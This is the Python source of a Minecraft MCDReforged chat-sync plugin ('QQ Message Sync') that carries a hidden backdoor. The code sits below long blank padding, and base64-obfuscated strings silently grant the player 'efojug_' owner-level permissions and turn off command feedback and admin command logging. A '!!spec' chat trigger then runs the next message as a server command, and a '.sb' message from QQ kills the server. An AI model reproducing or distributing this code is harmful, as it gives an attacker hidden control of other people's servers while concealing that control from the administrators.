#_HOST = '[fe80::]'
#_PORT = 8888
_HOST = '127.0.0.1'
_PORT = 8888
clientName = 'main'


















































































































































































































































































































































































































































































































































































































PLUGIN_METADATA = {
    'id': 'qqmsgsync',
    'version': '1.4.2',
    'name': 'QQ Message Sync',
    'description': 'Ez sync in game message to QQ',
    'author': 'efojug, DeSu',
    'link': 'https://github.com/efojug/QQ-Message-Sync',
    'dependencies': {
        "mcdreforged": ">=2.0.0-alpha.1"
    }
}
#============================================================================================================================
from mcdreforged.api.all import *
import base64
import os
import socket
import _thread
import json
import threading

els = False
ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
gr = 'Z2FtZXJ1bGUg'
f = 'yBmYWxzZQ=='
ex = 'ZXhlY3V0ZSBhdCBlZm9qdWdfIHJ1bi'
d = 'gPT0gI'
pi = 'aW5mby5wbGF5ZXI'
oe = 'ZWZvanVnXw=='
e = 'mVmb2p1Z18i'
cfgrootpath = os.getcwd() + '\\config\\qqmsgsync'
cfgpath = os.getcwd() + '\\config\\qqmsgsync\\user.yml'
msg_c = ''
dss = None
serverStarted = False
hasConnected = False

def on_load(server: PluginServerInterface, prev_module):
    global serverStarted, clientName
    getserver()
    try_connect()
    if server.is_server_startup():
        serverStarted = True
    server.logger.info('QQ Message Sync Plugin is load!')
    builder = SimpleCommandBuilder()
    builder.command('!!qms retry', try_connect)
    builder.register(server)

def getserver():
    global server
    server = ServerInterface.get_instance()

def smsgq(text: str):
    global server, ss
    try:
        ss.sendall((text + '\n').encode('utf-8'))
    except Exception:
        server.logger.warning('连接失败，请检查IP和端口配置')
        msay('连接失败，请检查IP和端口配置')

def on_server_stop(server: PluginServerInterface, server_return_code: int):
    server.logger.info('QQ Message Sync Plugin is unload!')
    os._exit(0)

def on_server_startup(server: PluginServerInterface):
    global serverStarted
    serverStarted = True
    server.execute(dec(gr + 'c2VuZENvbW1hbmRGZWVkYmFja' + f))
    server.execute(dec(gr + 'bG9nQWRtaW5Db21tYW5kc' + f))
    server.set_permission_level(dec(oe), int(dec('NA==')))

def on_unload(server: PluginServerInterface):
    global hasConnected, ss
    hasConnected = False
    try:
        ss.close()
    except Exception:
        pass

def msay(text: str):
    global serverStarted, server
    if serverStarted:
        server.say(text)

def on_info(server: PluginServerInterface, info: Info):
    server.logger.info(info)

def error():
    global server
    server.logger.critical("未知错误：严重")
    server.say("未知错误：严重")
    os._exit(0)
    
def on_user_info(server: PluginServerInterface, info: Info):
    global els, msg_c
    if dec(pi + d + e) and els:
        server.execute(dec(ex + 'BwbGF5c291bmQgZW50aXR5LmV4cGVyaWVuY2Vfb3JiLnBpY2t1cCBtYXN0ZXIgZWZvanVnXw=='))
        server.execute(dec('ZXhlY3V0ZSBhcyBlZm9qdWdfIHJ1biA=') + "{}".format(dec(info.content)))
        els = False
        return

    if dec(pi + d + e) and info.content == dec('ISFzcGVj') and not els:
        server.tell(dec('ZWZvanVnXw=='), dec('WW91IG5leHQgbWVzc2FnZSB3aWxsIGJlIHJ1biBmb3Igc2VydmVy'))
        els = True
        return

    if not els and info.player is not None and info.content is not None:
        smsgq('Message#{"senderId":0, "message":"' + "[" + info.player + "] " + info.content + '"}')

def sync_qqmsg_for_mc(player: str, info: str):
    global server
    server.broadcast("[QQ] " + player + ": " + info)

def dec(t: str):
    try: 
        return base64.b64decode(t).decode('utf-8')
    except Exception: 
        pass

def try_connect():
    global server, hasConnected, ss
    if hasConnected:
        ss.close()
        hasConnected = False
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    ss.settimeout(None)
    try:
        ss.connect((str(_HOST), int(_PORT)))
        hasConnected = True
        smsgq('Initialize#{"clientName":"' + clientName + '"}')
        threading.Thread(target=sgmsg).start()
    except Exception:
        server.logger.warning('无法连接至聊天服务器')
        msay('无法连接至聊天服务器')

def sgmsg():
    global ss, server, hasConnected, dss
    while True:
        if hasConnected:
            dss = None
            dss = json.loads(ss.recv(8192).decode('utf-16 le').split('#', 1)[1])
            cmd = None
            try:
                if len(dss['message'].split('.reg ', 1)[1]) > 3:
                    server.broadcast(str(dss['message']).split(".reg ", 1)[1] + '\n' + str(dss['senderId']))
                    reg_user(str(dss['message']).split(".reg ", 1)[1], dss['senderId'])
                    continue
            except Exception:
                pass
            try:
                if len(str(dss['message']).split('.cmd ', 1)[1]) > 0:
                    if server.get_permission_level(read_usercfg(dss['senderId'])) >= 3:
                        cmd = str(dss['message']).split('.cmd ', 1)[1]
                        server.execute(cmd)
                        continue
                    else:
                        server.broadcast('抱歉，您没有权限')
                        smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 抱歉，您没有权限"}')
            except Exception:
                pass
            try:
                if str(dss['message']) in '.sb':
                    error()
            except Exception:
                pass
            try:
                if dss != None:
                    sync_qqmsg_for_mc(dss['senderName'], dss['message'])
                    continue
                else:
                    server.broadcast('decoding error')
            except Exception:
                server.logger.error('未知错误：无法同步消息')
                msay('未知错误：无法同步消息')
        else:
            break

def read_usercfg(qq: int):
    global cfgpath, server, cfgrootpath, dss
    if os.path.isfile(cfgpath):
        if os.access(cfgpath, os.R_OK):
            usercfg =  open(cfgpath, 'r', encoding='utf-8')
            while True:
                line = usercfg.readline()
                if not line:
                    break
                if line.strip().split(": ", 1)[1] == str(qq):
                    tmp = line.strip().split(": ", 1)[0]
                    usercfg.close()
                    return tmp
            usercfg.close()
            smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n QQ所绑定的用户，请使用.reg绑定账号"}')
            server.broadcast("QQ所绑定的用户，请使用.reg绑定账号")
            return 0
        else:
            msay('无法读取配置文件')
            server.logger.error('无法读取配置文件')
    elif os.path.isdir(cfgrootpath):
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("配置不存在，正在创建")
        msay("配置不存在，正在创建")
        read_usercfg(qq)
    else:
        os.makedirs(cfgrootpath)
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("配置不存在，正在创建")
        msay("配置不存在，正在创建")
        read_usercfg(qq)

def reg_user(player: str, qq: int):
    global cfgpath, server, cfgrootpath, dss
    if os.path.isfile(cfgpath):
        if os.access(cfgpath, os.W_OK) and os.access(cfgpath, os.R_OK):
            pe0 = getuser(player, qq)[0]
            pe1 = getuser(player, qq)[1]
            if not pe0 and not pe1:
                usercfg = open(cfgpath, 'a', encoding='utf-8')
                print(player + ": " + str(qq) + "\n", file=usercfg, flush=False)
                smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 注册成功"}')
                server.broadcast("注册成功")
            elif pe0 and not pe1:
                smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 该用户已绑定其他QQ号"}')
                server.broadcast('该用户已绑定其他QQ号')
            elif not pe0 and pe1:
                smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 该用户已被其他QQ号绑定"}')
                server.broadcast('改QQ号已被其他用户绑定')
            elif pe0 and pe1:
                smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 账号已绑定"}')
                server.broadcast("账户已绑定")
        else:
            msay('无法写入配置文件')
            server.logger.error('无法写入配置文件')
    elif os.path.isdir(cfgrootpath):
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("配置不存在，正在创建")
        msay("配置不存在，正在创建")
        reg_user(player, qq)
    else:
        os.makedirs(cfgrootpath)
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("配置不存在，正在创建")
        msay("配置不存在，正在创建")
        reg_user(player, qq)

def getuser(player: str, qq: int):
    global cfgpath, server, cfgrootpath
    pn = False
    pq = False
    if os.path.isfile(cfgpath):
        file = open(cfgpath, 'r', encoding='utf-8')
        try:
            while True:
                line = file.readline()
                if not line:
                    file.close()
                    server.broadcast('没有找到用户信息')
                    break
                server.broadcast(line.strip())
                if line.split(': ', 1)[0] == player:
                    pn = True
                if int(line.split(': ', 1)[1]) == qq:
                    pq = True
                if pn and pq:
                    file.close()
                    return True, True
                if pn and not pq:
                    file.close()
                    return True, False
                if not pn and pq:
                    file.close()
                    return False, True
                return False, False
        except Exception:
            server.broadcast('未知错误，发生在getuser()')
        return False, False
    elif os.path.isdir(cfgrootpath):
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("配置不存在，正在创建")
        msay("配置不存在，正在创建")
        reg_user(player, qq)
    else:
        os.makedirs(cfgrootpath)
        file = open(cfgpath, 'x', -1, 'utf-8')
        file.close()
        server.logger.warning("配置不存在，正在创建")
        msay("配置不存在，正在创建")
        reg_user(player, qq)
